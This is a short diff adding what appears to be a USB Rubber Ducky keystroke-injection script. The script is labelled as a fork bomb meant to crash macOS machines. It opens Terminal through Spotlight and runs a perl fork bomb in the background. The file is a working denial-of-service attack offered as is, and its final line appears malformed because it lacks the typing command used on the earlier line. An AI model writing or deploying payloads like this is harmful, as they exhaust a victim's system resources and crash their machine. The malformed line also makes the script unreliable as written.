@@ -1,0 +1,6 @@
+REM Forkbomb to crash MacOS machines
+DEFAULT_DELAY 500
+GUI SPACE
+STRING terminal
+ENTER
+perl -e "fork while fork" &
